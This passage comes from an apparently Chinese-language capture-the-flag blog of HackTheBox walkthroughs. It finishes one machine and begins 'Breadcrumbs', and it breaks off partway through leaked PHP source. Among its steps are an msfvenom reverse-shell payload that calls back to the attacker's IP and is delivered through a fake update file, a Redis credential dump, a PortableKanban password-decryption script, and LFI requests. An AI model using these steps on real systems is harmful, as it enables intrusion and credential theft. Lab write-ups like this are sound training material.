<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=9996 -f exe &gt; s\<span class="string">&#x27;hell.exe</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cat latest.yml</span></span><br><span class="line"><span class="string">version: 1.2.3</span></span><br><span class="line"><span class="string">path: http://10.10.16.3:9999/s&#x27;</span>hell.exe</span><br><span class="line">sha512: pyfnrQs40RwrwKOWykgeZ0PKeSudGkN1UI/9j+PpxG4M42uY88j/hNAx7xWonk57X0GMdPIOma9FsfeBglTLMQ==</span><br></pre></td></tr></table></figure>
<p>开启HTTP服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 9999</span><br></pre></td></tr></table></figure>
<p>将<code>latest.yml</code>上传至<code>client*</code>文件夹中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\jason\desktop\user.txt</span><br><span class="line">3eda0e1bce259d8ffd4c1994f84bfdea</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-4"><a class="markdownIt-Anchor" href="#权限提升-4"></a> 权限提升</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\&quot;program files<span class="string">&quot;\redis\redis.windows.conf</span></span><br><span class="line"><span class="string">requirepass kidvscat_yes_kidvscat</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.10.10.237 -a kidvscat_yes_kidvscat</span><br><span class="line"></span><br><span class="line">keys *</span><br><span class="line">1) <span class="string">&quot;pk:ids:User&quot;</span></span><br><span class="line">2) <span class="string">&quot;pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0&quot;</span></span><br><span class="line">3) <span class="string">&quot;pk:ids:MetaDataClass&quot;</span></span><br><span class="line">4) <span class="string">&quot;pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff&quot;</span></span><br><span class="line"></span><br><span class="line">get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0</span><br><span class="line"><span class="string">&quot;&#123;\&quot;Id\&quot;:\&quot;e8e29158d70d44b1a1ba4949d52790a0\&quot;,\&quot;Name\&quot;:\&quot;Administrator\&quot;,\&quot;Initials\&quot;:\&quot;\&quot;,\&quot;Email\&quot;:\&quot;\&quot;,\&quot;EncryptedPassword\&quot;:\&quot;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\&quot;,\&quot;Role\&quot;:\&quot;Admin\&quot;,\&quot;Inactive\&quot;:false,\&quot;TimeStamp\&quot;:637530169606440253&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir c:\users\jason\downloads\</span><br><span class="line"></span><br><span class="line">d-----          4/2/2021   8:21 PM                PortableKanban</span><br></pre></td></tr></table></figure>
<p>存在一个密码恢复的漏洞</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> des <span class="keyword">import</span> * <span class="comment"># python3 -m pip install des</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params"><span class="built_in">hash</span></span>):</span></span><br><span class="line">	<span class="built_in">hash</span> = base64.b64decode(<span class="built_in">hash</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">	key = DesKey(<span class="string">b&quot;7ly6UznJ&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> key.decrypt(<span class="built_in">hash</span>,initial=<span class="string">b&quot;XuVUm5fR&quot;</span>,padding=<span class="literal">True</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(decode(<span class="string">&quot;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&quot;</span>))</span><br></pre></td></tr></table></figure>
<p>得到<code>kidvscat_admin_@123</code></p>
<p>evil-rm登入</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line">2b36cf6bd3cd95fc37d6e2f81e80163b</span><br></pre></td></tr></table></figure>
<p>这提权部分实在是过于牵强了…</p>
<hr />
<h1 id="hackthebox_breadcrumbs"><a class="markdownIt-Anchor" href="#hackthebox_breadcrumbs"></a> HackTheBox_Breadcrumbs</h1>
<h2 id="端口扫描-5"><a class="markdownIt-Anchor" href="#端口扫描-5"></a> 端口扫描</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.228</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.228</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 992 closed ports</span><br><span class="line">PORTSTATE    SERVICE   VERSION</span><br><span class="line">22/tcp   openssh  OpenSSH for_Windows_7.7 (protocol 2.0)</span><br><span class="line">80/tcp   openhttp Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)</span><br><span class="line">135/tcp  openmsrpcMicrosoft Windows RPC</span><br><span class="line">139/tcp  opennetbios-ssn    Microsoft Windows netbios-ssn</span><br><span class="line">443/tcp  openssl/http  Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)</span><br><span class="line">445/tcp  openmicrosoft-ds?</span><br><span class="line">1107/tcp filtered isoipsigport-2</span><br><span class="line">3306/tcp openmysql?</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port3306-TCP:V=7.91%I=7%D=6/11%Time=60C2E951%P=x86_64-pc-linux-gnu%r(NU</span><br><span class="line">SF:LL,49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.3&#x27;\x20is\x20not\x20allowe</span></span><br><span class="line"><span class="string">SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>)%r(GenericLines,</span><br><span class="line">SF:49,<span class="string">&quot;E\0\0\x01\xffj\x04Host\x20&#x27;10\.10\.16\.3&#x27;\x20is\x20not\x20allowed\x</span></span><br><span class="line"><span class="string">SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server&quot;</span>);</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
<h2 id="路径扫描"><a class="markdownIt-Anchor" href="#路径扫描"></a> 路径扫描</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.10.228/</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://10.10.10.228/ ----</span><br><span class="line">+ http://10.10.10.228/aux (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/books/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/Books/</span><br><span class="line">+ http://10.10.10.228/cgi-bin/ (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/com1 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/com2 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/com3 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/con (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/css/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/db/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/DB/</span><br><span class="line">+ http://10.10.10.228/examples (CODE:503|SIZE:401)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/includes/</span><br><span class="line">+ http://10.10.10.228/index.php (CODE:200|SIZE:2368)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/js/</span><br><span class="line">+ http://10.10.10.228/licenses (CODE:403|SIZE:420)</span><br><span class="line">+ http://10.10.10.228/lpt1 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/lpt2 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/nul (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/php/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/PHP/</span><br><span class="line">+ http://10.10.10.228/phpmyadmin (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/</span><br><span class="line">+ http://10.10.10.228/prn (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/server-info (CODE:403|SIZE:420)</span><br><span class="line">+ http://10.10.10.228/server-status (CODE:403|SIZE:420)</span><br><span class="line">+ http://10.10.10.228/webalizer (CODE:403|SIZE:301)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://10.10.10.228/portal/ ----</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/assets/</span><br><span class="line">+ http://10.10.10.228/portal/aux (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/com1 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/com2 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/com3 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/con (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/db/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/DB/</span><br><span class="line"></span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/includes/</span><br><span class="line">+ http://10.10.10.228/portal/index.php (CODE:302|SIZE:0)</span><br><span class="line">+ http://10.10.10.228/portal/lpt1 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/lpt2 (CODE:403|SIZE:301)</span><br><span class="line">+ http://10.10.10.228/portal/nul (CODE:403|SIZE:301)</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/php/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/PHP/</span><br><span class="line"></span><br><span class="line">+ http://10.10.10.228/portal/prn (CODE:403|SIZE:301)</span><br><span class="line"></span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/uploads/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.228/portal/vendor/</span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sat Jun 12 13:42:20 2021</span><br><span class="line">DOWNLOADED: 9224 - FOUND: 27</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-5"><a class="markdownIt-Anchor" href="#漏洞利用-5"></a> 漏洞利用</h2>
<p>访问路径<code>/php/books.php</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/includes/bookController.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line">title=a&amp;author=&amp;method=0</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/includes/bookController.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line">book=book7.html&amp;method=1</span><br></pre></td></tr></table></figure>
<p>可以看到对<code>/includes/bookController.php</code>发起的两种POST请求<br />
第二种请求存在LFI</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Warning:  file_get_contents(..&#x2F;books&#x2F;): Failed to open stream: No such file or directory in C:\Users\www-data\Desktop\xampp\htdocs\includes\bookController.php on line 28</span><br><span class="line">false</span><br></pre></td></tr></table></figure>
<p>且Apache配置上存在目录遍历漏洞, 可以配合LFI进行文件读取</p>
<ul>
<li><code>/portal/authController.php</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;db/db.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;cookie.php&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;vendor/autoload.php&quot;</span>;</span><br><span class="line"><span class="keyword">use</span> \<span class="title">Firebase</span>\<span class="title">JWT</span>\<span class="title">JWT</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$errors</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$userdata</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$valid</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//if user clicks on login</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$query</span> = <span class="string">&quot;SELECT username,position FROM users WHERE username=? LIMIT 1&quot;</span>;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$con</span>-&gt;prepare(<span class="variable">$query</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;get_result();</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_array(MYSQLI_ASSOC))&#123;</span><br><span class="line">            array_push(<span class="variable">$userdata</span>, <span class="variable">$row</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$userCount</span> = <span class="variable">$result</span>-&gt;num_rows;</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$userCount</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$password</span> = sha1(<span class="variable">$password</span>);</span><br><span class="line">            <span class="variable">$passwordQuery</span> = <span class="string">&quot;SELECT * FROM users WHERE password=? AND username=? LIMIT 1&quot;</span>;</span><br><span class="line">            <span class="variable">$stmt</span> = <span class="variable">$con</span>-&gt;prepare(<span class="variable">$passwordQuery</span>);</span><br><span class="line">            <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&#x27;ss&#x27;</span>, <span class="variable">$password</span>, <span class="variable">$username</span>);</span><br><span class="line">            <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">            <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;get_result();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="variable">$valid</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$stmt</span>-&gt;close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$valid</span>)&#123;</span><br><span class="line">            session_id(makesession(<span class="variable">$username</span>));</span><br><span class="line">            session_start();</span><br><span class="line"></span><br><span class="line">            <span class="variable">$secret_key</span> = <span class="string">&#x27;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&#x27;</span>;</span><br><span class="line">            <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">            <span class="variable">$payload</span> = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;data&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&quot;username&quot;</span> =&gt; <span class="variable">$username</span></span><br><span class="line">            ));</span><br><span class="line"></span><br><span class="line">            <span class="variable">$jwt</span> = JWT::encode(<span class="variable">$payload</span>, <span class="variable">$secret_key</span>, <span class="string">&#x27;HS256&#x27;</span>);</span><br><span class="line">            </span><br><span class="line">            setcookie(<span class="string">&quot;token&quot;</span>, <span class="variable">$jwt</span>, time() + (<span class="number">86400</span> * <span class="number">30</span>), <span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedIn&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$userdata</span>[<span class="number">0</span>][<span class="string">&#x27;position&#x27;</span>] == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="string">&quot;Awaiting approval&quot;</span>;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="variable">$userdata</span>[<span class="number">0</span>][<span class="string">&#x27;position&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            header(<span class="string">&quot;Location: /portal&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedIn&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;valid&#x27;</span>] = <span class="string">&quot;Username or Password incorrect&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elseif</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable">$passwordConf</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwordConf&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$username</span>))&#123;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;Username Required&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">4</span>)&#123;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;Username must be at least 4 characters long&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&quot;Password Required&quot;</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span> !== <span class="variable">$passwordConf</span>)&#123;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;passwordConf&#x27;</span>] = <span class="string">&quot;Passwords don&#x27;t match!&quot;</span>; </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$userQuery</span> = <span class="string">&quot;SELECT * FROM users WHERE username=? LIMIT 1&quot;</span>;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$con</span>-&gt;prepare(<span class="variable">$userQuery</span>);</span><br><span class="line">        <span class="variable">$stmt</span> -&gt;bind_param(<span class="string">&#x27;s&#x27;</span>,<span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;get_result();</span><br><span class="line">        <span class="variable">$userCount</span> = <span class="variable">$result</span>-&gt;num_rows;</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$userCount</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;Username already exists&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(count(<span class="variable">$errors</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$password</span> = sha1(<span class="variable">$password</span>);</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO users(username, password, age, position) VALUES (?,?, 0, &#x27;&#x27;)&quot;</span>;</span><br><span class="line">            <span class="variable">$stmt</span> = <span class="variable">$con</span>-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line">            <span class="variable">$stmt</span> -&gt;bind_param(<span class="string">&#x27;ss&#x27;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;execute())&#123;</span><br><span class="line">                <span class="variable">$user_id</span> = <span class="variable">$con</span>-&gt;insert_id;</span><br><span class="line">                header(<span class="string">&#x27;Location: login.php&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedIn&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">                <span class="variable">$errors</span>[<span class="string">&#x27;db_error&#x27;</span>]=<span class="string">&quot;Database error: failed to register&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>/portal/cookie.php</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $username  Username requesting session cookie</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string $session_cookie Returns the generated cookie</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@devteam</span></span></span><br><span class="line"><span class="comment"> * Please DO NOT use default PHPSESSID; our security team says they are predictable.</span></span><br><span class="line"><span class="comment"> * CHANGE SECOND PART OF MD5 KEY EVERY WEEK</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makesession</span>(<span class="params"><span 